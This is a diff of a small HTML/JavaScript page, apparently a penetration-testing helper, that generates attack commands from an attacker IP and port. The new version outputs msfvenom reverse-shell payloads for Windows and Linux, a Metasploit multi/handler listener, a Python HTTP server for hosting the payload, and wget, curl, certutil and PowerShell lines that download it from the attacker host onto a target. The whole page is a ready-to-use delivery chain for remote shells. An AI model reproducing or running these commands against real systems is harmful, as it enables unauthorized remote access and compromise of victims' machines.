@@ -47,42 +47,12 @@
     <hr>
     <input type="text" name="lhost" id="lhost" value="10.10.10.10" size="8" oninput="generate()">
     <input type="text" name="lport" id="lport" value="8990" size="1" oninput="generate()">
-    <select name="os" id="os" oninput="generate()">
-        <option value="windows/x64/">windows</option>
-        <option value="linux/x64/">linux</option>
-    </select>
-    <select name="type" id="type" oninput="generate()">
-        <option value="meterpreter">meterpreter</option>
-        <option value="shell">shell</option>
-    </select>
-    <select name="stage" id="stage" oninput="generate()">
-        <option value="/">staged</option>
-        <option value="_">stageless</option>
-    </select>
-
-    <p id="msfvenom"></p>
-    <p id="msfconsole"></p>
-
+    <pre id="output"></pre>
     <script type="text/javascript">
         function generate() {
             let lhost = document.getElementById("lhost").value;
             let lport = document.getElementById("lport").value;
-            let os = document.getElementById("os").value;
-            let type = document.getElementById("type").value;
-            let stage = document.getElementById("stage").value;
-
-            let extension = "txt";
-            if (os === "windows/x64/") {
-                extension = "exe";
-            } else if (os === "linux/x64/") {
-                extension = "elf";
-            }
-
-            let msfvenom = "msfvenom -p " + os + type + stage + "reverse_tcp LHOST=" + lhost + " LPORT=" + lport + " -f " + extension + " -o yz." + extension;
-            let msfconsole = "msfconsole -q -x \"use multi/handler; set payload " + os + type + stage + "reverse_tcp; set lhost " + lhost + "; set lport " + lport + "; exploit\"";
-
-            document.getElementById("msfvenom").innerHTML = msfvenom;
-            document.getElementById("msfconsole").innerHTML = msfconsole;
+            document.getElementById("output").innerHTML = "msfvenom -p windows/x64/shell_reverse_tcp LHOST="+lhost+" LPORT="+lport+" -f exe -o yz.exe\nmsfconsole -q -x 'use multi/handler; set payload windows/x64/shell_reverse_tcp; set lhost "+lhost+"; set lport "+lport+"; exploit'\n\nmsfvenom -p linux/x64/shell_reverse_tcp LHOST="+lhost+" LPORT="+lport+" -f elf -o yz.elf\nmsfconsole -q -x 'use multi/handler; set payload linux/x64/shell_reverse_tcp; set lhost "+lhost+"; set lport "+lport+"; exploit'\n\npython3 -m http.server 8000\npython2 -m SimpleHTTPServer 8000\n\nwget http://"+lhost+":8000/yz.elf\ncurl http://"+lhost+":8000/yz.elf -o yz.elf\n\ncertutil.exe -urlcache -split -f 'http://"+lhost+":8000/yz.exe' yz.exe\npowershell.exe IWR http://"+lhost+":8000/yz.exe -OutFile yz.exe\nIWR http://"+lhost+":8000/yz.exe -OutFile yz.exe";
         }
         generate();
     </script>
